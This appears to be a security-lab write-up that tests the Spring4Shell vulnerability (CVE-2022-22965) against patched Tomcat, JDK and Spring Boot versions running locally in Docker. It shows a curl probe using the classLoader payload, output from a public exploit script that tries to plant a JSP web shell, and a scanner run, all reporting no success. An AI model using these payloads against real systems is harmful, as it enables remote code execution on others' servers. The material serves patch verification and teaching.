So far we have tried poc exploit on vulnerable versions lets try exploit on fixed version of spring boot, tomcat and JDK 

Tomcat version: 8.5.78 (not vulnerable)
openJDK: 8 (not vulnerable)
Spring Boot: 2.6.6 (not vulnerable)

How to deploy?

```
docker build . -t sp4s-tomcat8.5.78-jdk8-spb2.6.6 && docker run -p 8002:8080 sp4s-tomcat8.5.78-jdk8-spb2.6.6
```

You can access the application at http://localhost:8002/helloworld/greeting

Test if application is vulnerable

## Using curl 

Source: https://twitter.com/RandoriAttack/status/1509298490106593283

If application is vulnerable it will return HTTP 400 code.

Original POC
```
$ curl host:port/path?class.module.classLoader.URLs%5B0%5D=0
```

Since our lab application endpoint accepts data from POST request we will send payload in body

```bash
curl -i http://localhost:8002/helloworld/greeting -d class.module.classLoader.URLs%5B0%5D=0
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en
Date: Sun, 17 Apr 2022 20:43:46 GMT
Connection: close
Content-Length: 185

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reznok's Hello World Spring Application</title>
</head>
<body>
    Hello World! Exploit me!
</body>
</html>
```

As suggested by poc author that application give 400 response if it is using vulnerable version since this version is not vulnerable
we get 200 OK response.

let's try to exploit it using another exploit poc


## POC 2

https://github.com/BobTheShoplifter/Spring4Shell-POC
```bash
python exploit.py --url http://localhost:8002/helloworld/greeting
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost:8002/shell.jsp?cmd=id
```

This poc tries to upload the shell and shows the response code and the shell location without verifying if the exploit actually
worked so if you go to the provided url you will get 404 Not Found error.


### POC 3
https://github.com/fullhunt/spring4shell-scan

```bash
python spring4shell-scan.py --url http://localhost:8002/helloworld/greeting
[•] CVE-2022-22965 - Spring4Shell RCE Scanner
[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
[•] Secure your External Attack Surface with FullHunt.io.
[•] URL: http://localhost:8002/helloworld/greeting
[%] Checking for Spring4Shell RCE CVE-2022-22965.
[•] URL: http://localhost:8002/helloworld/greeting | PAYLOAD: class.module.classLoader[z2xxa8m]=z2xxa8m
[•] Target does not seem to be vulnerable.
[•] No affected targets were discovered.
```

